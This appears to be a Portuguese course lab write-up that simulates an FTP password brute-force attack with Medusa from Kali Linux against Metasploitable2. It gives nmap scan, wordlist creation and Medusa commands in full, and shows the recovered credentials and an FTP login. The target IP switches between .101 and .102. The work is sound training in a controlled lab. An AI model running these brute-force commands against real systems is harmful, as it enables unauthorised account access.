# Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux.

## Visão geral
Desafio do curso de Cibersegurança 2025 da Santander com parceria DIO, com o intuito de práticar e simular ataques de força bruta e criação de wordlists em um ambiente controlado, utilizando os sistemas Kali Linux e a ferramenta Medusa para acessar o Metasploitable2 e DVWA.

---

## Verificação de ip
No Metasploitable2 que será utilizado como a máquina alvo iremos verificar o ip com o comando "ip a".
<img width="644" height="239" alt="image" src="https://github.com/user-attachments/assets/3b6471e9-e284-4381-8b16-6ff12a7dab3c" />
Obtivemos o ip “192.168.56.101” da máquina alvo.
Agora que conseguimos o ip da máquina alvo, será feito o teste de conectividade para verificar se as máquinas estão na mesma rede, com o comando.
ping -c 3 192.168.56.101
<img width="613" height="196" alt="image" src="https://github.com/user-attachments/assets/1b8b87c6-680a-4cd2-9c37-1d971ce055c2" />

---

##Verificação de portas abertas
Com as máqinas conectadas na mesma rede, iremos fazer a verificação de portas abertas da máquina alvo, com o comando.
nmap -sV -p 21,22,80,445,139 192.168.56.102
<img width="886" height="312" alt="image" src="https://github.com/user-attachments/assets/16846d38-2532-4d44-9f17-34b6a54dabe7" />
A porta que iremos atacar será a 21/tcp do serviço ftp.

---

##Criando listas de usuários e senhas + ataque com a Medusa
Com os seguintes comandos iremos criar os usuários e senhas para realizar o ataque com a Medusa.

echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

Lista de usuários e senhas criadas, agora será feito o ataque na máquina alvo com o seguinte comando.
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
<img width="886" height="378" alt="image" src="https://github.com/user-attachments/assets/eb510397-cee6-46e3-bc15-321fc51bae8b" />
Senha e usuário capturadas com sucesso.
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]

---

##Realizando o ataque
Com os dados da senha e usuário capturados é a hora de realizar o ataque a máquina alvo através do serviço ftp, com o comando.
ftp 192.168.56.101
<img width="495" height="292" alt="image" src="https://github.com/user-attachments/assets/c5c0a67b-84d7-4ac2-83fd-e282de270355" />
Máquina alvo acessada com sucesso.

---

